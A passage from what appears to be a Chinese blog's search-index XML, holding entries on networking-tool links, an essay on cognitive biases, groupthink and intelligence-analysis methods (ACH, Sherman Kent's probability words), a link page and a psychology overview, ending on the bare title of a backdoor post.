<li>Internet Control Messages Protocol (ICMP)  RFC 792</li>
<li><p>Internet Group Management Protocol (IGMP)  RFC 3376</p>
</li>
<li><p>Exterior Gateway Protocol  RFC 888</p>
</li>
</ul>
<h4 id="2-1-Software"><a href="#2-1-Software" class="headerlink" title="2.1 Software"></a>2.1 Software</h4><ul>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/" target="_blank" rel="noopener">计算机远程通信协议：从 从 CORBA 到 gRPC</a></li>
<li>DNSSEC : Domain Name System Security Extensions ，CDNS安全扩展，RFC 2535</li>
</ul>
<h2 id="二、调试工具"><a href="#二、调试工具" class="headerlink" title="二、调试工具"></a>二、调试工具</h2><h4 id="2-1-关于网络数据包的捕获、过滤和分析-Packet-Capturing"><a href="#2-1-关于网络数据包的捕获、过滤和分析-Packet-Capturing" class="headerlink" title="2.1 关于网络数据包的捕获、过滤和分析(Packet Capturing)"></a>2.1 <a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/" target="_blank" rel="noopener">关于网络数据包的捕获、过滤和分析(Packet Capturing)</a></h4><ul>
<li>What is Packet Capturing</li>
<li>How can it be used</li>
<li>What is libpcap</li>
<li>What is tcpdump &amp; winpcap &amp; snoop</li>
<li>What is BPF</li>
<li><p>What is gopacket</p>
</li>
<li><p><a href="http://cizixs.com/2017/10/23/tc-netem-for-terrible-network" target="_blank" rel="noopener">使用tc netem 模拟网络异常 | cizixs </a></p>
</li>
</ul>
<h4 id="2-2-Netfilter"><a href="#2-2-Netfilter" class="headerlink" title="2.2 Netfilter"></a>2.2 Netfilter</h4><ul>
<li><a href="http://blog.csdn.net/dog250/article/details/6572779" target="_blank" rel="noopener">赵亚：Linux的Netfilter框架深度思考-对比Cisco的ACL</a></li>
<li><a href="http://blog.csdn.net/dog250/article/details/9103817" target="_blank" rel="noopener">赵亚：探索iptables BPF模块的悲惨历程</a></li>
</ul>
<h2 id="三、模拟仿真工具"><a href="#三、模拟仿真工具" class="headerlink" title="三、模拟仿真工具"></a>三、模拟仿真工具</h2><ul>
<li><a href="https://www.quagga.net/" target="_blank" rel="noopener">Project Quagga</a></li>
<li><a href="https://linux.cn/article-4232-1.html" target="_blank" rel="noopener">使用 Quagga 将你的 CentOS 变成 OSPF 路由器</a></li>
</ul>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul>
<li><a href="https://blog.feedspot.com/networking_blogs/" target="_blank" rel="noopener">Top 100 Computer Networking Blogs and Websites To Follow in 2018</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://blog.csdn.net/dog250/article/details/71248888" target="_blank" rel="noopener">赵亚：用Netcat，SSH构建的IP层加密隧道搭建VPN</a></li>
<li><a href="http://blog.csdn.net/dog250/article/details/71076357" target="_blank" rel="noopener">赵亚： 从一个简单的聊天程序SimpleChat看VPN技术</a></li>
<li><a href="http://blog.csdn.net/dog250/article/details/70343660" target="_blank" rel="noopener">赵亚：BadVPN详解之—组网原理剖析</a></li>
<li><a href="http://blog.csdn.net/dog250/article/details/69668590" target="_blank" rel="noopener">赵亚：通信网络与IP网络底层传输技术梳理(SONET/SDH/OTN/ATM/Ethernet/MPLS/PTN…)</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>认知、偏见与决策</title>
    <url>/2019/02/10/Psychology-Biases/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>What is Trap</li>
<li>What is Bias</li>
<li>What is Behavior</li>
<li>Decision Tool &amp; Technology</li>
</ul>
<a id="more"></a>
<h2 id="情绪的动物"><a href="#情绪的动物" class="headerlink" title="情绪的动物"></a>情绪的动物</h2><blockquote>
<p>没有与环境无关的决策。所有的判断和决策都依赖于我们看待和解释世界的方式。—— Scott·Plous</p>
</blockquote>
<h4 id="心理陷阱"><a href="#心理陷阱" class="headerlink" title="心理陷阱"></a>心理陷阱</h4><p>心态与我们的思考相关，尤其是我们如何看待和解释世界。</p>
<p>我们通过心态使我们结合新的信息，从经验中吸取教训并且适应形势。我们的心态也可能阻碍我们。人们倾向于感知他们期望感知的；这些期望下意识地告诉我们“寻找什么、什么是重要的，以及如何解释看到的”。尽管我们不能摆脱心态，但是这不意味着我们无条件地接受它们。</p>
<p>清朝乾隆年间曾经发生过一场震惊朝野的“叫魂”风波。起初只是一个坊间流言（游走江湖的妖道淫僧会斩断男人的辫子，盗走他们的灵魂），实际上既无实际伤害又无政治企图，被逐级放大之后却触发了大皇帝的敏感神经，他一口咬定妖术背后存在政治风险，并一手策动了全国性的除妖运动。在皇帝的亲自指挥之下，除妖运动搅动了整个官场，庞大帝国的日常行政，田赋、科举、河工、盐政、肃贪，全部搁置，整个国家机器开动起来为其让路，全力进行对妖术的清剿。可是军机大臣们折腾 3个月后沮丧地发现，只拿到一大堆混淆不清的伪证，没有头绪的琐屑细节，以及许多不明不白毙命的囚犯。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Decision-QianLong.png" alt></p>
<blockquote>
<p>弘历的忧惧亦真亦幻。真实的部分在于，他难以打破官僚体制自我满足、常规裹足的积习。…… 幻影的部分则在于，他对于无法为他所见的势力心存恐惧。妖术当然就是这样的一种势力，但还有来自谋反和汉化的双重威胁。即便像弘历这样一个汉化的满洲君主，也无法将谋反和种族因素区分开来，而当一个案子牵涉到辫子的象征意象时，便足以成为使他疑虑爆发的导火索。—— 《叫魂——1768年中国妖术大恐慌》p280</p>
</blockquote>
<p>1768的妖术大恐慌也并非是中国独有的现象，欧洲中世纪晚期曾经出现过的“女巫大审判” —— 借由“猎杀女巫”之名，三个世纪内约有十万人被处死，其中绝大多数是无辜的女性，1950年代初期在美国狂热一时的麦卡锡主义 —— 实际受害人数难以估量，至少数以百计人被囚，约有1到1.2万人失去工作，很多情况下，仅仅是因为被众议院非美活动调查委员会或其它委员会传唤就足以开除某人。</p>
<p>《女巫之槌》（1484年两位教士撰写，详细列举了很多种识别女巫的方法）：</p>
<blockquote>
<p>如果被告过着不道德的生活，那么这当然证明她同魔鬼有来往；<br>而如果她虔诚而举止端庄，那么她显然是在伪装，以便用自己的虔诚来转移人们对她魔鬼来往和晚上参加巫魔会的怀疑。<br>如果她在审问时显得害怕，那么她显然是有罪的，良心使她露出马脚。<br>如果她相信自己无罪，保持镇静，那么她无疑是有罪的：因为女巫们惯于恬不知耻地撒谎。<br>如果她对向她提出的控告辩白，这证明她有罪；<br>如果她由于对她提出的诬告极端可怕而恐惧绝望、垂头丧气，缄默不语，这已经是她有罪的直接证据。<br>如果一个不幸的妇女在受刑时因痛苦不堪而骨碌碌地转眼睛，这意味着她正用眼睛来寻找她的魔鬼；<br>而如果她眼神呆滞、木然不动，这意味着她看见了自己的魔鬼，并正看着他。<br>如果她发现有力量挺得住酷刑，这意味着魔鬼使她支撑得住，因此必须更严厉地折磨她；</p>
</blockquote>
<h4 id="认识偏差"><a href="#认识偏差" class="headerlink" title="认识偏差"></a>认识偏差</h4><p>认知偏见(cognitive biases)并不总是坏事，偏见本质上是我们认知发展的捷径，使我们不必进行完整分析就能在日常生活中做出快速决策。它们确实节省了大量的时间，但却可能造成负面影响，导致人们急于根据假设做出错误的判断。</p>
<p>Richard Heuer 在 CIA 工作45年，被称为 “情报之父”。他在《情报分析心理学》（The Psychology of Intelligence Analysis,2010）一书中将认知偏见描述为：<strong>为减轻信息处理造成的精神压力而使用简化策略和经验法则作出判断和决定</strong>。</p>
<p>偏见的类型有很多种，常见的有：</p>
<ul>
<li><p><strong>证实性偏见（Confirmation bias）</strong>。倾向于寻找或注意那些能够支持我们已经形成的判断或结论的证据。存在偏差时，我们对支持我们理论的的信息给予了更大的权重，当人们积极地相信这个假设时，这种偏差可能更加明显。</p>
</li>
<li><p><strong>锚定效应（Anchoring bias）</strong>。过度信赖或过度重视他们听到的第一条信息。消除锚定效应的方法：首先关注需求和实际问题，其次提出假设，最后评估关键假设。</p>
</li>
<li><p><strong>叙事谬误</strong>。叙事谬误反映了我们偏好简洁、简单的情节，而不是复杂、不清晰的形势。</p>
</li>
<li><p><strong>期望简化</strong>。人们期望将复杂简化，在依赖于一个中心变量的情况下减少一切，使得我们感觉事务是整洁和可以理解的。风险是我们简化的越多，距离事实就越远 —— 我们面对的问题通常具有复杂性。</p>
</li>
<li><p><strong>易得性偏差（Availability bias）</strong>。过分强调手边的信息，而不管这些信息是否被分析过，对于以前见过的证据会因为熟悉而过度重视，而那些不熟悉的部分则会收到轻视。Richard Heuer 称这种偏见为 <strong>“把生动性当标准（Vividness Criterion）”</strong>，即人们认为亲身经历过或极为熟悉的事情要比那些不太熟悉的事情更重要。需要警惕这种偏见，因为这会使我们的经验变得弊大于利。</p>
</li>
<li><p><strong>从众效应（Bandwagon effect）</strong>。当多数人同意某一假设时，就会出现随大流的情况。如果群体的一致意见得到证据支持，重要的不是考虑“大家都同意”这个事实，而是应该看到那个证据。信息的一致性可能是因为信息之间是高度相关或冗余的，在这种情况下，多份相关的报告可能还不如一份独立的报告信息量更大。</p>
</li>
<li><p><strong>镜像效应（Mirroring）</strong>。如果某个分析人员认为对手的想法和决定与自己相似，就会发生镜像效应，或者说镜像偏差。这会导致分析人员假设对手按照分析人员本身的个人经历去决定做什么或不做什么，而这通常与实际情况完全不同。</p>
</li>
</ul>
<h4 id="灵长类社会"><a href="#灵长类社会" class="headerlink" title="灵长类社会"></a>灵长类社会</h4><p>常见的心态陷阱和认知偏见其实都有很深的心理学成因，或者换句话说源于长期演化在人类身上遗留的痕迹。生物学家在长期观察、研究中发现，灵长类动物普遍存在很多有意思的社会行为：</p>
<ul>
<li>1）<strong>亲密行为（affiliative behavior）</strong>。例如拥抱（embracing）、抱腰（holding lumbar，表示友谊有时又带有轻微的惩罚意味）、跟随（following，某一个体开始行动，另一个体就会紧随其后）、目光交流（communicating with the eyes，引导后者注意某种状况）、游戏（playing）等。</li>
<li>2）<strong>作威行为（displaying behavior）</strong>。例如用较大的动作如震跳、狂跑、摇树等幅度较大的动作发出巨大响声以示其威风。</li>
<li>3）<strong>威胁行为（threatening behavior）</strong>。例如瞪眼（staring）、对瞪（staring each other，双向威胁行为）。</li>
<li>4）<strong>攻击行为（aggressive behavior）</strong>。例如追赶（chasing）、抓打（grasping and hitting）、咬住（biting，攻击行为中强度最大）。</li>
<li>5）<strong>屈服行为（submissive behavior）</strong>。例如回避（avoiding）、蜷缩（crouching）、退却（retreating）、逃逸（fleeing，收到威胁或攻击时逃跑）。</li>
<li>6）繁殖行为（reproductive behavior）。</li>
<li>7）母性和幼儿行为（maternal and infant behavior）。</li>
</ul>
<blockquote>
<p>说理与论证战胜不了一些词语和套话。它们是和群体一起隆重上市的。只要一听到它们，人人都会肃然起敬，俯首而立。许多人把它们当作自然的力量，甚至是超自然的力量。它们在人们心中唤起宏伟壮丽的幻象，也正是它们含糊不清，使它们有了神秘的力量。它们是藏在圣坛背后的神灵，信众只能诚惶诚恐地来到它们面前。—— 《乌合之众》</p>
</blockquote>
<p>按照群体动力学(Group Dynamics)的观点，个人行为受到他人的影响，群体影响个人的决策过程。群体对个人行为的影响既有正面影响，也有负面影响。</p>
<ul>
<li><p><strong>同侪压力（Peer pressure）</strong>，指的是同侪施加的的一种影响力，它可以鼓励一个人为了遵守团体社会规范而改变其态度、价值观、行为。或者说因害怕被同伴排挤而放弃自我做出顺应别人的选择，也包括同辈（即与自己年龄、地位、所处环境相似的人）取得的成就所带给自己的心理压力。</p>
</li>
<li><p><strong>团体迷思（Groupthink，亦作集体错觉）</strong>，指的是团体在决策过程中，由于成员倾向让自己的观点与团体一致，因而令整个团体缺乏不同的思考角度，不能进行客观分析。一些值得争议的观点、有创意的想法或客观的意见不会有人提出，或是在提出之后，遭到其他团体成员的忽视及隔离。部分成员即使并不赞同团体的最终决定，但在团体迷思的影响下也会顺从团体。</p>
</li>
</ul>
<blockquote>
<p>一帮人在一起，不会有什么突破性的创见——即便是集市中那些无政府主义者组成的志愿者团体，通常也不能有真正的创见，更不要说公司委员会中那些为生计着想的还活在过去年代的人了。远见源自个人，其周遭社会机器的最好做法，就是响应这些有突破性的远见——滋养、奖赏并严格测试它们，而不是压制它们。—— 《大教堂与集市》</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Decision-Fire.png" alt></p>
<h2 id="决策工具"><a href="#决策工具" class="headerlink" title="决策工具"></a>决策工具</h2><blockquote>
<p>因为只有对某领域熟稔的个体，方才有资格作出高风险的决策。—— 《如何作出正确决策》</p>
</blockquote>
<p>在英语中，理性（rational）的原义强调事实而非情绪。</p>
<blockquote>
<p>牛津英语词典释义（rational）: (of behaviour,ideas,etc.)based on reason rather than emotions；(of a person) able to think clearly and make decisions based on reason rather than emotions.</p>
</blockquote>
<p>理性分析中通常使用大量“形式方法”（formal methods），例如各类结构化分析方法（Structured Analysis，SA），考虑不同的因素并且探究元素间的不同排列形式所蕴藏的含义。实际处理复杂事物时即使应用理性分析也会面临两大挑战：</p>
<p>首先是 <strong>时间压力</strong>。在时间压力之下，显然无法搜集到全面的线索。经验丰富的决策者为了适应时间压力，会将注意力集中到关系最为紧密的线索上，同时忽略其他的线索。</p>
<p>其次是 <strong>不确定性</strong>。</p>
<ul>
<li>1）信息缺失。无法获取信息。信息尚未被接受到，或者即使被接收，但是在需要时无法定位。</li>
<li>2）信息不可靠。信息来源的可靠性较低，或者即使信息本身高度精确，但其来源被知觉为并不可靠。</li>
<li>3）信息模糊或者相互矛盾。解释信息的合理方式不止一种。</li>
<li>4）信息繁复。难以将不同层面的数据加以整合。</li>
</ul>
<p>长期实践中人们发明了很多决策工具和技术，期望能最大限度地减少人类行为模式导致的决策错误：</p>
<h4 id="决策模型"><a href="#决策模型" class="headerlink" title="决策模型"></a>决策模型</h4><ul>
<li>最优化模型(optimization model)，侧重于寻找最佳策略。</li>
<li>满意度模型（satisficing model），即选择最先想到的那个可行选项。</li>
<li>可能性模型（contingency model），即所采取的决策策略，会根据决策任务的背景变化而有所差异。</li>
</ul>
<h4 id="训练直觉"><a href="#训练直觉" class="headerlink" title="训练直觉"></a>训练直觉</h4><p>直觉的概念中，包含了 <strong>模式匹配、识别典型案例</strong> 的能力，这些都是需要通过训练而获得的素质。</p>
<p>在实践中培训项目可以为受训者提供练习和实际决策情景；为培训人员发放艰难决策的故事集，将其作为培训材料；安排受训者去处理更加棘手的案例。</p>
<h4 id="结构化分析法"><a href="#结构化分析法" class="headerlink" title="结构化分析法"></a>结构化分析法</h4><ul>
<li>分类</li>
<li>矩阵</li>
<li>事件映射</li>
<li>事件树</li>
<li>主观概率</li>
<li>加权排序</li>
</ul>
<h4 id="诊断分析法"><a href="#诊断分析法" class="headerlink" title="诊断分析法"></a>诊断分析法</h4><ul>
<li>欺骗发现</li>
<li>关键假设查证</li>
<li>信息质量核实</li>
<li>征兆</li>
<li>指标</li>
<li>细致深入的研究</li>
</ul>
<h4 id="“高级”分析法"><a href="#“高级”分析法" class="headerlink" title="“高级”分析法"></a>“高级”分析法</h4><p>这些方法通常将多种基本的结构化分析方法和诊断方法相结合。</p>
<ul>
<li>形成态势理解和结论：集思广益、比较、数学分析、情境分析等。</li>
<li>分析复杂的网络和关联：链接分析、网络分析、社交网络分析等。</li>
<li>模式分析：大事记、模式分析图表、事件透明图等。</li>
</ul>
<h4 id="改进型头脑风暴（名义群体法，NGT）"><a href="#改进型头脑风暴（名义群体法，NGT）" class="headerlink" title="改进型头脑风暴（名义群体法，NGT）"></a>改进型头脑风暴（名义群体法，NGT）</h4><p>名义群体法（NGT）是对传统的头脑风暴的一种有价值的替代。</p>
<p>在传统的头脑风暴中，一个想法展示给一个群体，个人表达他们的想法，然后由一名促进者写下来。传统头脑风暴的问题是：</p>
<ul>
<li>少数个人可能主导讨论，较安静的人可能不会发表意见。</li>
<li>群体讨论产生的固定想法将导致群体一致性，考虑的宽度不够。</li>
</ul>
<p>名义群体法的不同之处在于，每名团队成员都在沉默中思考问题，然后写下他们的答案和建议，随后收集、整理和考虑这些答案和建议，并且在群体中展示。群体也可以再次写下新的答案，就更深入的想法进行投票。</p>
<h4 id="竞争性假设分析-ACH"><a href="#竞争性假设分析-ACH" class="headerlink" title="竞争性假设分析 ACH"></a>竞争性假设分析 ACH</h4><p><a href="https://en.wikipedia.org/wiki/Analysis_of_competing_hypotheses" target="_blank" rel="noopener">竞争性假设分析(Analysis of Competing Hypotheses,ACH)</a>是 CIA 使用30年以上的研究方法论，ACH 帮助面对巨大量数据和假设条件时，进行有逻辑性的分析，指导研究人员识别争论的焦点，进行富有成效的讨论。</p>
<p>竞争性假设分析法强制分析人员考虑全部可能性，而不是凭直觉挑出来某一假设，再找证据支持这一假设。实施该分析方法分为 8 个步骤：</p>
<ul>
<li>1）确定需要考虑的可能假设。例如一组不同背景和不同视角的分析人员开展头脑风暴。</li>
<li>2）列出支持或反对各个假设的重要证据。</li>
<li>3）建立ACH矩阵。假设为行，证据为列，逐一评估各个证据对各项假设是支持还是反对。</li>
<li>4）初步分析各个证据的相关性，改进矩阵。</li>
<li>5）初步论证各个假设的可能性。这一步需要注重反驳假设，而不是证明它是正确的。</li>
<li>6）分析结论对于单项证据的依赖程度。</li>
<li>7）评估全部假设的可能性。</li>
<li>8）确认是否需要重新评估分析。</li>
</ul>
<p><strong>不足：时效性</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>H1</th>
<th>H2</th>
<th>H3</th>
<th>H4</th>
<th>H5</th>
</tr>
</thead>
<tbody>
<tr>
<td>E1</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>E2</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>E3</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>E4</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>E5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>E6</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h4 id="置信级别"><a href="#置信级别" class="headerlink" title="置信级别"></a>置信级别</h4><p>谢尔曼·肯特（Sherman Kent）被很多人称为情报分析之父，他在1964年写了一篇名为“Words of Estimative Probability”的文章，其中描述了各种定性方式来描述分析师对置信级别的判断。</p>
<p>在所有的重要分析中，分析员(或者外部专家)必须就其对所表达判断的信心水平进行全面评估和明确表态。</p>
<blockquote>
<p>起初分析员的信心水平很低，但几个月后，他们的信息水平就很高了。决策者非常清楚分析员在这个问题上的观点发生了变化。—— 《不完美风暴》p117</p>
</blockquote>
<ul>
<li><strong>量化那些无法量化的内容</strong></li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>概率</th>
<th>估计词汇</th>
<th>估计词汇</th>
<th>偏差区间</th>
</tr>
</thead>
<tbody>
<tr>
<td>100%</td>
<td>确定</td>
<td>Certainty</td>
<td></td>
</tr>
<tr>
<td>93%</td>
<td>几乎确定</td>
<td>Almost certain</td>
<td>上下浮动 6%</td>
</tr>
<tr>
<td>75%</td>
<td>可能</td>
<td>Probable</td>
<td>上下浮动 12%</td>
</tr>
<tr>
<td>50%</td>
<td>一半可能</td>
<td>Chances about even</td>
<td>上下浮动 10%</td>
</tr>
<tr>
<td>30%</td>
<td>大概不是</td>
<td>Probablly not</td>
<td>上下浮动 10%</td>
</tr>
<tr>
<td>7%</td>
<td>几乎不可能</td>
<td>Almost certainly not</td>
<td>上下浮动 5%</td>
</tr>
<tr>
<td>0%</td>
<td>不可能</td>
<td>Impossibility</td>
</tr>
</tbody>
</table>
</div>
<h4 id="判断标准"><a href="#判断标准" class="headerlink" title="判断标准"></a>判断标准</h4><ul>
<li>清晰度。</li>
<li>准确性。特别需要注意的是，我们倾向于以自我为中心或以社会为中心的角度思考</li>
<li>精确度。</li>
<li>相关性。</li>
<li>深度。</li>
<li>广度。</li>
<li>逻辑性。</li>
<li>重要性。</li>
<li>公平性。</li>
</ul>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h5 id="群体动力学"><a href="#群体动力学" class="headerlink" title="群体动力学"></a>群体动力学</h5><p>群体动力学(Group Dynamics / Population Dynamics)亦称“团体动力学”，试图通过对群体现象的动态分析发现其一般规律的理论。最早在文献中使用群体动力学这一术语的，是其创始人勒温。他认为，个体的行为是由个性特征和场(指环境的影响)相互作用的结果。</p>
<p>简单的说，群体动力学认为在群体中，只要有别人在场，一个人的思想行为就同他单独一个人时有所不同，会受到其它人的影响。</p>
<h5 id="团体迷思"><a href="#团体迷思" class="headerlink" title="团体迷思"></a>团体迷思</h5><p>团体迷思（Groupthink，亦作集体错觉）。一般认为团体迷思这个概念是由美国心理学家艾尔芬·詹尼斯首先提出。但William Safire于2004年8月8日《纽约时报杂志》（New York Times Magazine）撰文指出，团体迷思一词实为William H. Whyte于1952年在《财富杂志》中首先提出。</p>
<p>1972年，詹尼斯利用“团体迷思”一词形容团体作出不合理决定的决策过程。<br>1982年，詹尼斯再探究美国入侵猪猡湾事件、偷袭珍珠港事件、韩战、越战、古巴导弹危机、马歇尔计划的发展、水门事件等美国政府历年外交决策事件，参照各个事件的环境、决策过程、决策结果，归纳出团体迷思的模型。</p>
<h5 id="麦卡锡主义"><a href="#麦卡锡主义" class="headerlink" title="麦卡锡主义"></a>麦卡锡主义</h5><p>麦卡锡主义（McCarthyism）是在没有足够证据的情况下指控他人不忠、颠覆、叛国等罪。它也指“使用不公正断言、调查方式，特别是对持异议者和批评者进行打击。有侵略性地质询他人的爱国情操，在缺乏证据的情况下进行指控，使用对他人不忠的攻击来胁迫对方，排斥异己，使用国家安全为理由亵渎人权，以及各种煽动性、蛊惑人心的行为，都称为“麦卡锡主义”。麦卡锡主义也是猎巫、集体发疯和道德恐慌的同义词。</p>
<p>一般认为麦卡锡时代在约瑟夫·麦卡锡本人参与之前就已经开始了。许多因素导致了麦卡锡主义：</p>
<ul>
<li>第一次红色恐慌(1917–20年)</li>
<li>1945年苏联间谍案（伊格尔·古琴科和伊丽莎白·宾利）</li>
<li>1949年苏联进行核试验，美国支持的国民党政府败退中国大陆</li>
<li>1950年朝鲜战争爆发;美国国务院高级官员阿尔杰·希斯因作伪证而定罪（间谍）；在英国，克劳斯·福克斯承认自己在洛斯阿拉莫斯国家实验室的曼哈顿计划上为苏联做间谍。</li>
<li>1953年罗森堡夫妇被处决(1950年被捕)，被控为苏联偷窃核弹机密。</li>
<li>1950年2月9日，美国参议员约瑟夫·麦卡锡在林肯纪念日对西弗吉尼亚共和党妇女俱乐部的演讲。</li>
<li>1949年到1954年间，总计有109项调查由各类”忠诚审查会”或其它国会委员会执行。</li>
<li>1954年12月2日美国参议院以65票对22票通过了对约瑟夫·麦卡锡的谴责，称其“有将参议院陷入耻辱和恶名的趋势。”</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="http://riboseyim.github.io/2019/02/10/Psychology-Biases/" target="_blank" rel="noopener">情绪的动物：认知、偏见与决策</a></li>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">工程伦理：国之重器，在人不在宝 | 挑战者号航天飞机事故调查</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/" target="_blank" rel="noopener">红楼故事：康熙的秘密情报系统</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.qbzz.org/oa/pdfdow.aspx?Sid=150121" target="_blank" rel="noopener">竞争性假设分析法在大型突发性事件分析中的应用研究—以“马航MH370失联事件”为例 - 情报杂志</a></li>
<li><a href="https://cn.nytimes.com/china/20160302/c02chinakuhn/" target="_blank" rel="noopener">孔飞力已逝，当今中国“叫魂”术未断绝 | 纽约时报中文网 | 2016</a></li>
<li><a href="http://history.sina.com.cn/bk/mqs/2015-09-07/1416125307.shtml" target="_blank" rel="noopener">叫魂：一个谣言如何引发国家级事件</a></li>
</ul>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Psychology</tag>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>QuickStart</title>
    <url>/2017/11/16/QuickStart/</url>
    <content><![CDATA[<p>QuickStart</p>
<span id="more"></span>
<ul>
<li><p><a href="https://riboseyim.github.io/2017/05/26/Catalog/">RiboseYim’s Blog Root Catalog</a></p>
</li>
<li><p><a href="https://riboseyim.github.io/2018/01/01/Check2018/">2018 年度盘点</a></p>
</li>
<li><p><a href="https://riboseyim.github.io/2018/09/15/Engineering-Blog/">Engineering Blog</a></p>
</li>
<li><p><a href="https://riboseyim.github.io/2018/09/11/Engineering-Index/">Engineering Index</a></p>
</li>
<li><p><a href="https://riboseyim.github.io/2017/02/13/Master/">Study The Master</a></p>
</li>
<li><p><a href="https://riboseyim.github.io/2017/12/19/Linux-Win-Mac/">Commands: Linux、Mac、Windows</a></p>
</li>
<li><p><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></p>
</li>
</ul>
<h4 id="WordBook"><a href="#WordBook" class="headerlink" title="WordBook"></a>WordBook</h4><ul>
<li><a href="https://riboseyim.github.io/2018/03/21/Machine-Learning-WordBook/">Machine Learning WordBook</a></li>
</ul>
<h4 id="我的电子书列表"><a href="#我的电子书列表" class="headerlink" title="我的电子书列表"></a>我的电子书列表</h4><ul>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master">《The Linux Perf Master| 操作系统性能专家》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master | 网络安全专家》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/ebook-data-visualization-master">《The Data Visualization Master | 数据可视化专家》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master | 机器学习专家》</a></li>
<li><a href="https://www.mybridge.co">Mybridge:Read great articles relevant for your work</a></li>
</ul>
<h4 id="知识分享圈子"><a href="#知识分享圈子" class="headerlink" title="知识分享圈子"></a>知识分享圈子</h4><ul>
<li><p>知识星球|睿哥读书会（年费制）<br><img src="http://riboseyim-qiniu.riboseyim.com/quanzi-rui-small.png" alt="知识星球|睿哥读书会"></p>
</li>
<li><p>知识星球|系统运维专家（免费加入）<br><img src="http://riboseyim-qiniu.riboseyim.com/quanzi-devops-small.png" alt="知识星球|系统运维专家"></p>
</li>
<li><p>知识星球|Machine Learning 小组（免费加入）<br><img src="http://riboseyim-qiniu.riboseyim.com/quanzi-machinelearning-small.png" alt="知识星球|Machine Learning 小组"></p>
</li>
<li><p>知识星球|经济学人翻译社（免费加入）<br><img src="http://riboseyim-qiniu.riboseyim.com/quanzi-economist-small.png" alt="知识星球|经济学人翻译社"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
  </entry>
  <entry>
    <title>心理学 | Overview of Psychology</title>
    <url>/2017/11/27/Psychology/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h4 id="认知科学"><a href="#认知科学" class="headerlink" title="认知科学"></a>认知科学</h4><p>认知科学（Cognitive Science），研究消息如何在大脑中形成以及转录过程的跨领域学科。它研究何为认知，认知有何用途以及它如何工作，研究信息如何表现为感觉、语言、注意、推理和情感。认知科学的基本要义是：理解思维的最好途径，是认识脑中的代表性结构，以及这些结构中发生的计算性过程。</p>
<h2 id="专题文集"><a href="#专题文集" class="headerlink" title="专题文集"></a>专题文集</h2><ul>
<li><a href="http://riboseyim.github.io/2019/02/10/Psychology-Biases/" target="_blank" rel="noopener">情绪的动物：认知、偏见与决策</a></li>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">国之重器，在人不在宝 | 挑战者号航天飞机事故调查</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/" target="_blank" rel="noopener">红楼故事：康熙的秘密情报系统</a></li>
</ul>
<h2 id="参考书"><a href="#参考书" class="headerlink" title="参考书"></a>参考书</h2><ul>
<li>《情报分析心理学》（ The Psychology of Intelligence Analysis，Richard Heuer）</li>
<li>《情报分析：以目标为中心的方法》（Intelligence Analysis,a Target-Centric Approach,2003）</li>
<li>《批判性思维基本原理》林达·艾德尔</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.psychologytoday.com/us/blog/the-clarity/201812/my-top-10-psychology-books-2018" target="_blank" rel="noopener">My Top 10 Psychology Books of 2018</a></li>
<li><a href="http://nautil.us/issue/55/trust/why-your-brain-hates-other-people-rp" target="_blank" rel="noopener">Why Your Brain Hates Other People | BY ROBERT SAPOLSKY ILLUSTRATION BY IGNACIO SERRANO DECEMBER 14, 2017</a></li>
<li><a href="https://www.psychologytoday.com/us/blog/the-nature-nurture-nietzsche-blog/201812/how-culture-makes-us-smarter" target="_blank" rel="noopener">How Culture Makes Us Smarter | Cumulative culture gives us knowledge and tools far beyond our individual powers</a></li>
</ul>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Psychology</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyber-Security:事与愿违的后门程序</title>
    <url>/2017/11/06/CyberSecurity-BackDoor/</url>
